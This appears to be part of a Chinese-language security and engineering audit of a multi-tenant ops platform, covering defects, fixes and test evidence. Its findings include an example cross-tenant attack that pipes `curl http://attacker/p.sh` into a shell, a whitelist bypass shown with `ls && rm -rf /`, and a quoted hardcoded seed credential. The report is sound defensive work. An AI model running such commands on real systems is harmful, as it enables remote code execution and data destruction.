2. `docker` job 指向 `host.docker.internal:9323`，而 dockerd 默认不暴露 `/metrics`
   （需显式配置 `metrics-addr`；Linux 宿主默认也没有 `host.docker.internal` 这个主机名）。

叠加 `prometheus-alerts.yml` 里的 `up == 0` / `MySQLDown` / `RedisDown`，就是永久的红色噪音。
**假告警比不配告警更危险**：它训练值班人员整体忽略告警，真故障会随之被淹没。

修复：新增 `blackbox-exporter`（`prom/blackbox-exporter:v0.25.0` + `deploy/monitoring/blackbox.yml`，
仅内网抓取不发布宿主端口）；给两个拨测 job 补齐标准 `relabel_configs`（`__param_target` /
`instance` / `__address__`）；`docker` job 默认注释并写明启用方式。
`deploy.sh` 冒烟测试新增断言：`up == 0 and (time()-timestamp(up)) < 60` 必须为空，
否则**判部署失败**（用 `timestamp` 过滤是为了排除「配置里已删除的 job」在 5 分钟
staleness 窗口内的历史样本，避免重启后误判）。

真机验收：9 个采集目标全部 `up`，`up==0` 命中 0 条，`/api/v1/alerts` 0 条 firing。

---

### P0-5 升级/迁移不安全：多副本竞态 + 失败静默降级

> **状态：已修复（2026-09-25）**，代码 + 真实 MySQL 8.0.46 集成测试通过（含整链回滚在内的 13/13）。
> 修复实现见本节末尾「修复交付物」，线上版本门禁实测证据见 **§10.3**。

```
证据：internal/store/sql.go  runMigrations
  - 无 MySQL 咨询锁（全仓库无 GET_LOCK），多副本同时启动会在 schema_migrations 主键上竞争
  - 单文件事务在 MySQL 下无意义（DDL 隐式提交），失败后无回滚
  - 迁移失败非致命：initWithRetry 仅记日志「运行期可能不可用」并返回可用 store
    → 服务带着半迁移的 schema 对外提供读写
证据：internal/store/migrations/004_add_audit_trace_id.sql:13  裸 ALTER ADD COLUMN，非幂等
证据：17 个迁移中仅 2 个有 .down.sql；无「二进制版本 ↔ schema 版本」门禁（旧二进制可跑新 schema）
证据：pkg/migrate 为死代码（无调用方）
```

**影响**：第一次带 `replicas>1` 的滚动升级就可能出现半迁移库对外服务；回滚只能靠人工恢复备份。这是企业客户升级时的头号事故源。

**修复方案（约 10–15 人天）**：引入 `GET_LOCK` 咨询锁 + 迁移前 schema 版本检查 + 失败 fail-fast（拒绝启动而非降级）+ 迁移幂等化 + 为无 down 的迁移补回滚脚本 + 删除或接入 `pkg/migrate`。

**修复交付物（2026-09-25 实施）**

1. **并发串行化**：`acquireMigrationLock` 用 MySQL 咨询锁 `GET_LOCK('opsmesh_mig_<库名>', 60)` 串行化迁移；
   锁名按库隔离（多租户各 schema 互不阻塞），超长库名退化为 sha256 前缀（MySQL 锁名 ≤64 字符）；
   锁为会话级故获取/释放共用同一 `*sql.Conn`，release 幂等且用独立 5s ctx（调用方 ctx 已取消也能释放）。
2. **失败 fail-fast**：`initWithRetry` 失败后 `NewSQLStore` 关闭连接池并返回错误，
   **拒绝以不完整 schema 启动**（旧实现仅记日志「运行期可能不可用」并返回可用 store）；
   `seedRBAC` 失败同样不再吞掉——缺 admin 用户等于不可登录。
3. **确定性故障不重试**：新增 `fatalMigrationError` 哨兵，checksum 不匹配与版本门禁命中时
   立即返回（不做 3s×20 退避重试）。
4. **版本门禁（新增 3.6 步）**：库内已应用版本 **高于** 本二进制已知最高版本 → 拒绝启动
   （防二进制回滚后旧版本读写新 schema）。
5. **迁移幂等化**：`applyMigration` 去掉事务（MySQL DDL 隐式提交，「单文件事务」对 DDL 是幻觉），
   改为**可重放**：1050/1060/1061/1091 四类「对象已存在/不存在」错误**必须**先经
   `information_schema` 二次核实（`parseIdempotentDDL` + `ddlTargetExists`）且与期望状态一致才放行，
   无法结构化解析的语句一律失败退出（不吞错）。半迁移中断后重启即可自愈收敛。
6. **回滚脚本补齐**：18 个迁移全部配 `.down.sql`（001 重写为真实逐表 DROP 并加破坏性警告；
   003 因表归属 001 保持说明性占位）。`.down.sql` 由 `migrationFiles()` 显式跳过，不参与自动执行。
7. **删除死代码** `pkg/migrate/`（808 行 + 24 测试，零调用方，且其 `_migrations` 表与现状冲突）。
8. **文档**：`docs/operations.md` §6.3 重写为「schema 迁移与回滚」（机制表 + 迁移清单 + 手工回滚流程 + 升级顺序约束）。

**实测收口（真实 MySQL 8.0.46，`internal/store/migration_test.go` 集成层，含 4 组纯逻辑测试共 13/13 通过；复跑记录见 §10.3）**：
`TestRunMigrationsFreshDB`（全新库建齐 21 张表）、`TestRunMigrationsIdempotent`（连跑 3 次）、
`TestSchemaMigrationsTable`、`TestMigrationLock_ExcludesOtherSession`（B 会话等锁超时 → 释放后成功）、
`TestRunMigrations_VersionGate`（库内 9999 → 拒绝启动且为 fatal 类）、`TestRunMigrations_ChecksumGateFatal`、
`TestRunMigrations_ReplayAfterHalfApplied`（删掉版本记录模拟半迁移 → 重放收敛）、
`TestRunMigrations_ConcurrentStores`（4 个 store 并发构造全部成功）、
`TestMigrationDownScripts_UnwindChain`（倒序执行全部 down 脚本 → 库内只剩 `schema_migrations`）。
另有 5 组纯逻辑测试（`splitSQLStatements` / `migrationFiles` 排序 / `parseIdempotentDDL` 正负例 /
锁名构造 / `fatalMigrationError` 穿透）无需 DB 即可回归。

---

### P0-6 多租户隔离：生产模式下买不到，且代码里存在跨租户命令执行 🔴

> **状态：问题 A / 问题 B 均已修复（2026-09-25）**，代码 + 单元/负向测试通过。
> 修复实现见本节末尾「修复交付物」，线上落库与越权拒绝实测证据见 **§10.4**。

这一项有两个独立问题，叠加后结论是「多租户既不可用也不安全」。

**问题 A：内置用户中心无法表达租户，生产模式下多租户不可用。**

```
证据：internal/store/models.go:16-28  User 结构体【没有 TenantID 字段】
证据：internal/controlplane/auth_tokens.go:216-219  签发 JWT 时硬编码 TenantID: "default"
      （注释："用户中心为平台级，统一 default 租户"）
证据：--trust-gateway-headers（网关注入角色的唯一路径）在生产模式被强制 false
      （config.go:796-800）
实测：生产模式下伪造 X-Tenant-ID → 401 "identity header without verifiable credential"
```

即：内置路径签发的所有用户恒在 `default` 租户；网关路径在生产被禁用。**README「IAM 与租户隔离」所描述的按租户隔离，在实际生产部署中无法配置出来**（用户无法被指派到租户）。若产品要按多租户售卖，这是结构性缺口。

**问题 B：四条「下发到 agent」的路径缺少 AgentID 的租户校验，而任务队列按 agentID 寻址。**

这是当前代码中真实存在的**跨租户远程命令执行**漏洞：

```
【创建侧缺校验】以下路径取了请求体里的 deviceID/agentID 直接建任务，未校验目标 agent 属于调用方租户：
  internal/controlplane/script.go:293-301        POST /api/v1/scripts/{id}/execute  ← 且 sc.Content 未过 validateCommand
  internal/controlplane/automation.go:47-60      automation execute_task 动作（command 来自用户规则参数）
  internal/controlplane/config_hotpush.go:84-91  配置热推（TaskTypeFile 写文件）
  internal/controlplane/config_hotpush.go:168-176 canary 批量（agentIDs 数组）
  对照：server_tasks.go:155-157 等路径【有】正确的 agent.TenantID != tenant → 403 校验
【消费侧无租户维度】任务队列按 agent_id 单独寻址：
  internal/store/sql_tasks.go:499-502
    SELECT ... FROM tasks WHERE agent_id=? AND (status IS NULL OR status='pending') ... LIMIT 1 FOR UPDATE
  internal/store/memory.go:693-711  m.tasks[agentID] 遍历
  → 无 tenant_id 过滤；agent 侧执行时亦不校验 task.TenantID（agent.go:905-920）
```

**攻击链**（已通过代码逐环节确认）：
1. 租户 A 中具备 `script:write`/`cmdb:write` 的主体（`cmdb` 属 operatorGroups，故**默认 operator 角色即可**）创建一个内容为 `curl http://attacker/p.sh | sh` 的脚本；
2. `POST /api/v1/scripts/{id}/execute {"deviceID":"<租户 B 的 agentID>"}` → 无租户校验，任务创建成功；
3. 租户 B 的 agent 按 agent_id 领取并执行该任务（通常以 root 身份）。

**商用影响**：租户隔离是多租户运维平台的**核心商业承诺**，这条路径一旦被客户的安全团队发现，交易即终止。当前 exploitability 取决于部署中是否真实存在多个租户（内置用户中心下不会，安装令牌/网关注入下会），但**只要卖出多租户版本就立刻成为最高危漏洞**。

**修复方案（约 5–10 人天）**
1. 四条路径统一补 `lookupAgent` + `agent.TenantID != callerTenant → 403`（可直接复用 `server_tasks.go:155` 的既有模式，改动很小）。
2. 任务领取 SQL 增加 `tenant_id=?` 条件（agent 侧携带自己的租户）作为第二道闸。
3. `script.Content` 入队前过 `validateCommand`（当前完全绕过）。
4. 战略决策：若要卖多租户，需在 User 模型加 TenantID 并放开 Y 路径的租户作用域；若不卖，则应在 README 中**明确降级该宣传点**。

**修复交付物（2026-09-25 实施，问题 A + 问题 B 一并修复）**

问题 A（用户中心支持租户）：
1. `store.User` 增加 `TenantID` 字段（`internal/store/models.go`），持久化列 `users.tenant_id`
   由迁移 `018_users_tenant_id.sql` 引入（含 `.down.sql` 回滚）；SQLStore 的用户查询/写入
   全部带上该列（`userColumns` 常量），MemoryStore seed 账号统一 `DefaultTenantID`。
2. 签发 JWT 不再硬编码 `TenantID: "default"`（`auth_tokens.go`）：改为取用户自身 `TenantID`
   （空值归一为 default）。`tenantFromBearer` 由此拿到真实用户租户，**网关路径之外的内置登录
   路径也能表达租户**（`TestLogin_JWTContainsUserTenant` 断言 `/me` 与 bearer 解析均为 acme）。
3. 用户创建/更新入口新增租户指派与校验（`auth_users.go`）：平台管理员可指派任意合法租户；
   租户管理员只能在本租户内创建（跨指派 403）；租户 ID 走白名单正则
   `^[A-Za-z0-9_.-]{1,64}$`（`validateTenantID`），因为该值会流入多租户 schema 名。
4. `RequireAuth` 拒绝空租户（无租户上下文的用户不可进入业务路径）。

问题 B（跨租户命令执行）：
5. **下发侧统一收口**：新增 `internal/controlplane/tenant_guard.go`，提供 `requireTenantAgent`
   （HTTP 路径，失败写 403）/ `tenantAgent`（非 HTTP）/ `tenantAgentIn`（无 `*Server` 引用的执行器）
   三个入口，判定语义与既有正确实现（`handleCreateTask` 等）逐字一致：
   `agent == nil || (tenant != "" && agent.TenantID != tenant)` → 拒绝。
   四条漏洞路径全部改走该入口：`script.go`（脚本执行）、`automation.go`（执行器
   ExecuteTask/Scale/Restart/Isolate）、`config_hotpush.go`（热推 + canary 批量，批量在**建任何任务前**
   先全量校验，避免部分成功）、`server_tasks.go` 的 `validateCommand` 注释同步纠正。
6. **脚本内容不再绕过命令校验**：脚本执行路径的任务 command 是脚本体，此前完全不过
   `validateCommand`；现已在入队前校验（含管道/重定向等元字符一律 400），并在
   `validateCommand` 注释中写明「脚本路径同样受限，如需复合命令应拆分任务并由部署方放开
   agent 端白名单」。
7. **领取侧数据层兜底**（第二道闸，防止未来新增路径漏校验）：
   `SQLStore.ClaimTask` 的 SELECT 增加 `AND (tenant_id IS NULL OR tenant_id='' OR tenant_id=?)`，
   `?` 取「agent 自身租户」（`s.Agent(agentID)`）；`MemoryStore.ClaimTask` 同语义。
   **刻意不改 `Store` 接口签名**（`ClaimTask(agentID string)` 保持原样），避免 ~35 处测试调用改写；
   任务侧租户为空视为「存量无标记数据」放行，不饿死历史任务。
   语义已验证：跨租户任务会被**跳过**（继续尝试后续可领任务），而非简单返回 nil。

**负向测试（新增 3 个测试文件，全部通过）**：
`internal/controlplane/tenant_isolation_test.go`（脚本执行 / 热推 / canary 批量 / 自动化执行器
四条路径的跨租户 403 + 「同租户放行」正例 + 「拒绝时不产生任何任务」断言 + 注入型脚本内容 400）、
`internal/controlplane/tenant_users_test.go`（租户指派权限边界、`/me` 与 JWT 租户一致性、
列表不跨租户泄漏）、`internal/store/claim_tenant_test.go`（领取侧跳过跨租户任务、
空租户兼容、同租户正常领取）。

---

### P0-7 微服务持久化被静默降级：生产库里没有表（数据重启即丢）✅ 已修复（2026-09-25，端到端实证见 §9.4）

**这一项是「真机跑起来」才发现的，静态读代码看不出——因为代码「看起来」是支持 SQL 的。**

```
证据：docker logs opsmesh-alert-svc
  MySQL store 初始化失败，回退 memory: open mysql: invalid bool value: true?parseTime=true
证据：docker logs opsmesh-config-svc   → 同样一行
证据：SHOW TABLES FROM opsmesh_alert / opsmesh_config / opsmesh_log
  → 三个库都由 init-databases.sql 建好了，但【一张表都没有】
证据：services/{alert,config}-svc/internal/store/mysql.go  ensureParseTime()
  → 无条件在 DSN 末尾追加 "?parseTime=true"
实证（驱动层对照）：
  旧实现输出 .../opsmesh_alert?parseTime=true?parseTime=true → mysql.ParseDSN err=invalid bool value: true?parseTime=true
  新实现输出 .../opsmesh_alert?parseTime=true                → mysql.ParseDSN err=<nil>
```

**影响**：compose 已为 alert-svc / config-svc 配好 `*_STORE_TYPE=sql` 与 DSN（即运维明确要求持久化），
但 DSN 拼接缺陷让 `sql.Open` 必然失败，服务只打一行日志就**静默退回内存存储**：
告警规则、告警记录、静默、配置项、配置历史、密钥全部只活在进程里，**重启即归零**；
而 `/health` 依然是 200，`deploy.sh` 冒烟测试全绿，监控也看不见——这是最难在客户现场排查的一类故障。

波及面（同类实现共 10 个服务）：alert、autoscaler、config、deploy、gpu、incident、log、plugin、portal、workflow。
其中 compose 生产栈内实际命中：**alert-svc、config-svc**（`opsmesh_log` 因 log-svc 走 loki 后端未接 SQL，暂无数据面影响）。

**修复交付物（2026-09-25 实施）**
1. 10 个服务的 `ensureParseTime` 改为幂等实现（已含 `parseTime=` 直接返回；已含 `?` 则用 `&` 追加），
   每个服务补 `internal/store/dsn_test.go` 回归测试（3 个用例：无参数 / 已含 parseTime / 仅含其它参数）。
   10 个模块 `go test` 全绿；把旧实现临时还原后测试确实失败（非「永远通过」的假测试）。
2. **SQL 初始化失败不再静默回退**：8 个服务（alert/auth/config/deploy/device/incident/plugin/portal）
   的 `log.Printf("...回退 memory")` 改为 `log.Fatalf("...停止启动")`，与 task-svc 及控制面
   `--production` 的既有 fail-fast 策略对齐（`docs/architecture.md:871` 早已写明该原则，
   微服务此前的回退行为与文档不一致）。

**防回归**：`dsn_test.go` 随各模块 CI 执行；fail-fast 属「配置要求 SQL 就必须真上 SQL」的语义，
不满足即拒绝启动，不会再有第二条静默降级路径。

**实测收口（2026-09-25，真机）**：重新部署后 `opsmesh_alert` 有 3 张表、`opsmesh_config` 有 5 张表
（修复前均为 0 张），`alerts` / `config_entries` 均可 SELECT；负向用例「非法 DSN 启动 alert-svc」
返回退出码 1 并打印 `MySQL store 初始化失败，停止启动`。完整记录见 §9.4 / §9.6。

---

## 3. P1 高风险项（商用前应修，可排在 P0 之后）

| # | 问题 | 证据 | 商用影响 | 工作量 |
|---|---|---|---|---|
| **P1-1** | **agent 命令白名单可被 `&&` 绕过**。`--agent-shell-whitelist` 只校验首个 token，而 `&&` 两端均放行（agent 侧 `agent.go:1043-1048`，控制面 `server_tasks.go:94-99`）。`ls && rm -rf /` 首 token `ls` 命中白名单，右侧照常执行。代码注释称 `&&`「不引入任意命令执行」——该推理对白名单场景不成立。 | `internal/agent/agent.go:1077-1115`（白名单）、`agent.go:1020-1022`（明确不拦管道 `\|`）、`internal/controlplane/server_tasks.go:90`（控制面【有】拦管道） | 默认开启的白名单被宣传为生产加固项，实际不提供隔离；且两端策略不一致（控制面拦 `\|`、agent 不拦） **→ 修复（2026-09-25）**：白名单改为按「执行段」校验——先按 `&&`/`||`/`|` 切段（`>&`/`&>` 重定向不误切），再逐段取命令词匹配，任一段未命中即整条拒绝；带路径的命令词仅系统标准可执行目录按 basename 匹配（非标准目录须显式白名单整条路径），`VAR=value cmd` 前缀 fail-closed。验证见 §11 | 1–2 pd |
| **P1-2** | **全机群共用一个 agent HMAC 密钥，且签名不覆盖载荷**。签名为 `HMAC(secret, timestamp+agentID)`，不覆盖任务内容/结果；`Register` 不返回 per-agent 密钥；agent 执行 shell 任务时不隔离环境变量，故任一 agent 被 RCE 即泄漏全机群密钥。 | `internal/controlplane/grpc/grpc.go:294-297`、`:274-277`；`internal/agent/agent.go:1149-1154`（未设 cmd.Env） | 单点失守 → 全机群可被冒领任务、可伪造上报结果（审计可信度归零）；无按 agent 吊销能力 **→ 修复（2026-09-25）**：① **签名升级为 v2 并覆盖载荷**——`HMAC-SHA256(secret, "v2\n"+timestamp+"\n"+identity+"\n"+payloadDigest)`，两端共用 `internal/grpcx/agentsig.go` 独立计算同一摘要（同秒换内容/篡改载荷即验签失败），v1 仅作滚动升级期兼容并按 agent 限次 WARN；② **per-agent 密钥下发双门槛**——一次性 install token 原子消费 **且** 连接为 TLS 才返回密钥（明文拒发），落盘 `<dataDir>/agent.key`（0600），控制面按「per-agent 优先、预共享兜底」选取；③ **任务子进程环境白名单**——`executeShell`/`execService` 只透传运行所需最小集合 + `LC_*`，堵住「任一任务读 `/proc/self/environ` 即拿到签名密钥」；④ 新增验签/密钥来源指标与 3 条告警规则，滚动升级顺序（先控制面、回滚先 agent）写入 `docs/operations.md`。验证见 §13 | 5–8 pd |
| **P1-3** | **审计日志不可防篡改，且无保留策略、无查询索引**。`audit_log` 为普通追加表，无 hash 链/签名（`migrations/001_initial.sql:78-86`）；全仓库无 DELETE/归档/分区逻辑；`QueryAudits` 以 `tenant_id + created_at` 过滤但仅 `idx_audit_trace` 一个索引，长期运行后审计检索将全表扫描。 | `internal/store/sql_audits.go`、`migrations/001_initial.sql`、`internal/controlplane/server_audits.go:15-16` | README「100% 留痕 / 等保三级 ≥6 月」仅靠「永不删除」满足，但**无防篡改**（持 DB 凭证即可改写历史，等保三级明确要求审计记录防篡改）；且查询会随时间劣化 **→ 修复（2026-09-25）**：迁移 019 引入哈希链（`prev_hash`/`entry_hash`，`entry_hash=sha256(prev_hash‖长度前缀字段…)`，`created_at` 秒截断）+ `audit_chain_head` 单行链头（写入事务内 `FOR UPDATE` 串行化，多副本不分叉）+ 链式写入失败降级普通 INSERT（数据不丢、自检如实计 `legacyRows`）；`VerifyAuditChain` 平台级/租户级双强度校验 + `GET /api/v1/audit/verify`（200/409/501/500）；`--audit-retention-days`（默认 180 天）由 leader 周期归档至 `audit_log_archive` + `audit_archive_meta` 边界哈希（跨归档边界仍可校验）；补 `idx_audit_tenant_created` / `idx_audit_entry_hash`；新增 4 个指标与 2 条告警规则。**诚实边界**：无密钥链无法对抗全链重写，需外部 WORM 锚定（未内置）。验证见 §12 | 3–5 pd |
| **P1-4** | **无界的 agent 日志缓冲会导致进程 OOM**。`agentLogs` 切片按 agent 每 30s 追加且永不裁剪；`deviceMetrics` map 无淘汰。 | `internal/store/sql_agent_logs.go:24-27` 及 memory 同名实现 | 机群规模上去后数周内控制面 OOM；商用 SLA 不可承诺 **→ 修复（2026-09-25）**：新增 `internal/store/memory_bounds.go` 统一施加硬上限——`deviceMetrics` 设备条目 ≤2000（超限按「最久未写入」淘汰整条设备，排序刻意用写入时刻而非 agent 可控的 `CollectedAt`）、`agentLogs` 批次 ≤2000 且总行数 ≤100000（超限丢最旧批次并回收底层数组容量）。验证见 §11 | 2–3 pd |
| **P1-5** | **未鉴权即可造成指标内存耗尽 DoS**。中间件对**每个请求**（含 404 与未鉴权请求）记录指标，`normalizePath` 仅归一全数字段，`/api/v1/<随机串>` 原样入 map 且无上限；`/metrics` 默认放行（空 CIDR 白名单=不限制），无全局限流器。 | `internal/controlplane/server_middleware.go:169-177,207-228`、`internal/metrics/metrics.go:61-66,100-110`、`internal/controlplane/server_netsec.go:129-131` | 远程未鉴权即可打爆内存导致控制面重启 **→ 修复（2026-09-25）**：四层收敛——(1) 时序硬上限 2000（超限折叠 `:other` + 自观测指标）；(2) `normalizePath` 收紧（段 >48B／含非安全字符／全数字 → `:id`；整路径 >200B → `/:overlong`）；(3) 8080/9091 两处 `/metrics` 均接入准入，生产模式空 CIDR 改 fail-closed；(4) 生产未显式配置时默认启用 200 req/s/IP 限流，限流器 IP 桶上限 5 万（超限先清空闲桶，仍满则放行但不建桶）。真机实测见 §11 | 2–3 pd |
| **P1-6** | **可支撑性缺口**（影响交付后的运维成本）。无版本端点、无 pprof、无配置转储、无诊断包；日志级别硬编码 Info；`/metrics` 抓取本身会做 4 次全表读。 **→ 主体修复（2026-09-26）**：`GET /version` + `--log-level`/`OPSMESH_LOG_LEVEL`（非法值 fail-fast）+ `GET /api/v1/admin/config`（白名单脱敏）+ `GET /api/v1/admin/diagnostics`（zip 诊断包）+ `--debug-pprof`（默认关 + 复用 metrics CIDR 双层门槛）；`logx` 补 Debug/SetLevel/SetOutput，`pkg/log` 收口到 logx（修 3 处级别与每调用建 handler 缺陷）；顺带修掉 `-ldflags -X` 包路径全仓写错导致**发布产物版本注入从未生效**。详见 §17。**后续同日追加**：`/metrics` 全表读已改 TTL 缓存、新增运行期级别开关、17 个微服务日志已接入统一 JSON 管道（逐点严重级别为增量项）——见 §17.5。 | `internal/controlplane/server_lifecycle.go`（151 条路由中无上述项）、`internal/logx/logx.go` | 客户现场排障必须 SSH + 看源码，支持成本高、无法远程定位问题 | 6–10 pd |
| **P1-7** | **许可与第三方合规未就绪**。LICENSE = Apache-2.0（`Copyright 2026 OpsMesh Contributors`），**无 NOTICE / THIRD_PARTY 清单**；依赖含 MPL-2.0 组件（go-sql-driver/mysql、hashicorp/vault/api、terraform-plugin-sdk/v2）；Helm 应用商店 28 个条目引用 bitnami 仓库与 bitnami.com 图床，而 Bitnami 已于 2025 年调整镜像授权策略。 | `LICENSE`、`go.mod`、`internal/helm/catalog.go` | 采购/法务尽调会要求第三方声明；Apache-2.0 意味着**任何第三方可自由再分发你的商业产品**（是否可接受需商业决策）；应用商店在客户无外网时不可用，且可能撞上 Bitnami 授权限制 | 3–5 pd + 法务 |
| **P1-8** | ~~控制面的 M3/M5 子存储仍可静默退回内存~~ **✅ 2026-09-25 已修**。`NewDeployHandler` / `NewOrchestrationHandler` 在 `deploy.NewSQL` / `orchestration.NewSQL` 构造失败时只 `logx.Error` 后改用 `Memory`，且工厂拿不到 `cfg.Production`，故生产模式下同样静默。 | `internal/controlplane/factory/server_factory.go`（原 `:32-47`、`:51-66`）；调用方 `internal/controlplane/server.go:309-310` 未传生产标志 | 部署模板/M5 编排数据在重启后丢失，而 `/health` 与界面均正常。触发窗口窄（主 store 已在同一 DSN 上跑完迁移，通常先失败），但属「配置要求持久化却跑在内存」的同一类缺陷 | **修复**：工厂接线生产标志，生产模式下子存储构造失败改为 fail-fast（对齐既有阻断先例），`server_factory_test.go` 覆盖两分支；验证见 §10.5 |
| **P1-9** | **交付树中残留开发调试页面，内含硬编码凭据**。`deploy/docker/index.html` 是一份手工冒烟测试页：登录表单把 `viewer` / `viewer123` 直接写死在 `value=` 属性里，`var API = 'http://localhost:8080'` 硬编码明文地址，「改密」按钮把口令固定改成 `NewPass123`，并把 token 前 30 字符回显到页面。该文件**未被任何 compose/部署文件引用**（孤立文件），因此未被实际部署——但它是残留物，且恰好印证了 P0-1：团队自己的测试习惯仍依赖 `viewer123` 可用，这可能是该账号在生产存活未被察觉的原因之一。 | `deploy/docker/index.html`（全文） | 交付物卫生问题；若被误拷入静态目录即成凭据泄露；给客户做源码审计时会被质疑 | ✅ 2026-09-25 已删除（随 P0-4 遗留物清理批次）；复核 `deploy/docker/` 现仅剩 Dockerfile/脚本/证书与 compose |

---

## 4. 真正值得肯定的部分（避免低估）

评估应双向诚实。以下是我实际验证后确认**做得好**的地方：

1. **核心卖点不是 PPT**。`pkg/provision/auto.go:111` 真的调用 `discover.Sweep(ctx, cidr, []int{22,9100}, ...)` 做 TCP 扫描，并有 SSH 推送信号量限流（`sshSem` 并发 8）、advertise 格式白名单、生产模式强制 HTTPS（防中间人投毒 agent 二进制）。**「网段自动发现纳管」是真实现的。**
2. **持久化是真的**。`internal/store/` 有 100+ 文件，35 个领域接口 × 3 种实现（Memory/SQL/MultiSchema）+ 编译期断言；`sql_ticket.go`/`sql_slo.go`/`sql_traffic.go`/`sql_billing.go` 等为真实 CRUD。此前担心的「15 个领域桩实现」经核实**已全部落地**（`StubDomains = []string{}`，且 `StubNotImplemented` 在非测试代码中**零调用点**）。
3. **版本化迁移框架存在**（17 个迁移 + checksum 记录 + 部分 down 脚本），虽然安全性有 P0-5 的问题，但框架本身是对的，不是裸 `CREATE TABLE`。
4. **前端 XSS 防护经核实良好**（我独立复核了安全子代理的结论）。个人版 209 处 `innerHTML` 中 **205 处是 `innerHTML = ''` 清空**，1 处为静态 SVG 图标表，1 处 `el()` 的 `html` 键**全仓库零调用者**；文本一律走 `textContent`/`createTextNode`。两版前端均无 `eval`/`new Function`/`v-html`。CSP 为 per-request nonce 且已移除 `script-src 'unsafe-inline'`。
5. **防守意识好的细节**（读代码时反复出现）：租户头伪造被拒绝并给出可操作提示；`validateCommand` 与控制面/agent 双层校验的纵深设计意图；联邦转发 HMAC 覆盖 method+path+ts+identity+body；CI 用 `shadow-observe` 双轨对照抓出真实 bug；登录防爆破在我实测中确实触发了 429。
6. **i18n 完整**：企业版 en/zh 各 2482 个键，数量完全对齐——不是「只做中文」。
7. **测试投入真实**：`internal/agent` 单包测试耗时 64 秒并通过，说明有实质用例而非空壳；`internal/authctx`、`pkg/tenant` 亦实测通过。
8. **依赖安全状况良好（独立复验）**：本次实际运行 `govulncheck ./...` → **`No vulnerabilities found`（0 个可达漏洞）**，仅有 1 个存在于所需模块中但代码不可达的告警。这与项目 `.trivyignore` 中「经符号级可达性分析确认不可达」的豁免依据一致——该豁免是**有据可查的合规豁免，而非一豁了之**。企业客户的安全评审在这一项上会顺利通过。

---

## 5. 需要你做的架构决策（非缺陷，但影响商用成本）

**双轨架构的代价正在显现，建议尽早收敛。**

| 现状 | 数据 |
|---|---|
| 单体控制面 | `internal/` 非测试 74,773 行，其中 `internal/controlplane` 一个包 **56,150 行 / 155 个文件**（占内核 75%） |
| 18 个微服务 | `services/*` 非测试约 52,797 行，每个 `go.mod` 均含 `replace github.com/Levango7/OpsMesh => ../../` |
| 默认部署 | README 明确「微服务部署（可选，默认不启用）」——即默认交付路径**不使用**这 5.3 万行 |

**两个具体问题**：

1. **微服务不是独立模块**。`replace` 指向 `../../` 意味着它们无法独立版本化、独立发布；根模块任何改动都可能同时打破 18 个服务。这与「微服务」的工程目的相悖。
2. **同一领域两套实现需人工保持同步**。例如 `services/task-svc/internal/store/mysql.go`（857 行）与 `internal/store/sql_tasks.go`（750 行）是 task 域的两份独立实现。项目为此付出了 `docs/td60-consistency-report.md`（47KB 一致性报告）+ shadow-observe CI 的持续成本。

**建议**：明确二选一。若目标客户是中大型企业私有化部署（当前能力与文档均指向此），**单体 + 干净的单包边界**更划算；把微服务降级为「规模化预留」并冻结投入，直到确有客户需求。这笔省下的维护成本，远大于 P0 修复的总和。

---

## 6. 商用路线图

### 阶段一：可交付（必做，约 25–40 人天）—— ✅ 已全部完成
目标是「客户能装上、能登进去、能安全用」。

| 顺序 | 事项 | 工作量 | 出口标准 |
|---|---|---|---|
| 1 | ~~P0-1 管理员口令可控 + 种子账号强制轮换~~ ✅ 2026-09-25 | ~~2–3 pd~~ | ~~生产模式下运维可登录；种子口令无法登录~~ 已达成 |
| 2 | ~~P0-2 HTTP TLS 或修正文档 + 移除误导性 HSTS~~ ✅ 2026-09-25 | ~~1–3 pd~~ | ~~浏览器流量全程加密或明确由代理终止~~ 已达成（`--http-tls` 三态，生产默认 HTTPS） |
| 3 | ~~P0-4 部署资产修复~~ ✅ 2026-09-25 | ~~5–8 pd~~ | ~~`docker compose up` 与 `helm install` 开箱即通~~ 已达成（compose 真机 17 容器全 Up） |
| 4 | ~~P0-6 租户校验补齐（4 条路径 + 队列过滤）~~ ✅ 2026-09-25 | ~~5–10 pd~~ | ~~跨租户下发返回 403；集成测试覆盖~~ 已达成（`tenant_guard.go` 统一入口 + 4 路径接线 + 领取侧 SQL 门 + 伪造租户头 401） |
| 5 | ~~P0-3 企业版前端纳入交付~~ ✅ 2026-09-25 | ~~3–5 pd~~ | ~~`/enterprise/` 可用；CI 构建产物入库~~ 已达成（构建期 `go:embed` 进二进制；产物不入库，由嵌套 `.gitignore` 白名单化；CI 黑盒断言） |
| 6 | ~~P0-5 迁移加锁 + 失败 fail-fast~~ ✅ 2026-09-25 | ~~10–15 pd~~ | ~~3 副本并发启动迁移通过；失败拒绝启动~~ 已达成（咨询锁 + checksum/版本门禁 + 可重放；真实 MySQL 13/13 集成测试通过） |
| 7 | ~~P0-7 微服务持久化静默降级~~ ✅ 2026-09-25（评估中发现） | ~~3–5 pd~~ | ~~生产库真实建表、重启不丢数据~~ 已达成 |
| 8 | ~~P1-8 M3/M5 子存储静默降级~~ ✅ 2026-09-25 | ~~1 pd~~ | ~~生产模式构造失败 fail-fast~~ 已达成 |

> **本阶段已收口**：7 项 P0 阻断项 + 1 项同类 P1 全部修复，并以真机全栈复验（`verify-runtime.sh` 58 项全过、
> 静态门禁 20 项全过、真实 MySQL 迁移集成测试 13/13）为交付证据。详细记录见 §9 / §10。

### 阶段二：可运维（约 12–20 人天）
目标是「出问题能查、能升级、能恢复」。

- ~~P1-1 白名单绕过修复（1–2 pd）~~ ✅ 2026-09-25
- ~~P1-4 日志/指标缓冲加上限与淘汰（2–3 pd）~~ ✅ 2026-09-25
- ~~P1-5 指标基数控制 + `/metrics` 生产默认受限（2–3 pd）~~ ✅ 2026-09-25
- ~~P1-2 per-agent 密钥下发 + 签名覆盖载荷 + 任务环境隔离（5–8 pd）~~ ✅ 2026-09-25（原列于阶段四，因属技术类高风险提前收口；密钥轮换与滚动升级顺序见 `docs/operations.md` §9.2.4 / §11.4）
- ~~P1-6 版本/诊断端点 + 日志级别可配 + 结构化日志统一（6–10 pd）~~ ✅ 2026-09-26（主体交付并真机验证，见 §17；「微服务日志统一」与 `/metrics` 全表读作为残留项另批处理）
- `docs/dr-runbook.md` 恢复流程可执行化（当前手册读 `/backup`，而 `mysql-statefulset.yaml` 并未挂载该路径 → 首次演练必失败）（1–2 pd）

> 本阶段 P1-1 / P1-2 / P1-3 / P1-4 / P1-5 已收口并真机复验（`verify-runtime.sh` 断言 94 项 0 失败、静态门禁 20 项 0 失败），
> 并对「Docker Desktop 端口转发不保留真实来源 IP」这一部署形态边界做了对照实验与文档化（见 §11.3）。

